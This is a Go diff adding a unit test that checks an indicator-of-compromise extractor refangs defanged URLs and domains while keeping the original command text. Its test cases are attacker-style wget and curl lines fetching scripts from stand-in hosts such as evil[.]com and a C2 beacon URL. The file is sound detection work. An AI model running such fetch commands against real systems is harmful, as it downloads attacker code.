@@ -426,3 +426,51 @@ func TestExtractWallet(t *testing.T) {
 		t.Error("bare 40-hex SHA-1 was not extracted as a hash")
 	}
 }
+
+// TestExtractRefang verifies defanged indicators (a universal threat-intel
+// convention) are refanged before extraction, so IOCs in dropped scripts /
+// notes are captured - while the command IOC keeps the original text.
+func TestExtractRefang(t *testing.T) {
+	e := NewExtractor()
+	cases := []struct {
+		cmd       string
+		wantType  string
+		wantValue string
+	}{
+		{"download from hxxp://evil[.]com/x.sh", IOCTypeURL, "http://evil.com/x.sh"},
+		{"c2 at hxxps://bad[.]org/beacon", IOCTypeURL, "https://bad.org/beacon"},
+		// defanged URL host with [.] / [dot] resolves to a domain IOC.
+		{"wget hxxp://evil[.]com/m", IOCTypeDomain, "evil.com"},
+		{"curl hXXps://c2[dot]bad[dot]org/x", IOCTypeDomain, "c2.bad.org"},
+	}
+	for _, tc := range cases {
+		ev := makeIOCEvent("203.0.113.5", "command", tc.cmd, nil)
+		var found bool
+		for _, i := range e.Extract(ev) {
+			if i.Type == tc.wantType && i.Value == tc.wantValue {
+				found = true
+			}
+		}
+		if !found {
+			got := []string{}
+			for _, i := range e.Extract(ev) {
+				got = append(got, i.Type+":"+i.Value)
+			}
+			t.Errorf("command %q: expected %s IOC %q, got %v",
+				tc.cmd, tc.wantType, tc.wantValue, got)
+		}
+	}
+
+	// The command IOC must retain the ORIGINAL (defanged) text, not the refanged
+	// copy - we don't rewrite what the attacker actually typed.
+	ev2 := makeIOCEvent("203.0.113.5", "command", "curl hxxp://evil[.]com", nil)
+	var cmdVal string
+	for _, i := range e.Extract(ev2) {
+		if i.Type == IOCTypeCommand {
+			cmdVal = i.Value
+		}
+	}
+	if !strings.Contains(cmdVal, "hxxp://evil[.]com") {
+		t.Errorf("command IOC should preserve original defanged text, got %q", cmdVal)
+	}
+}
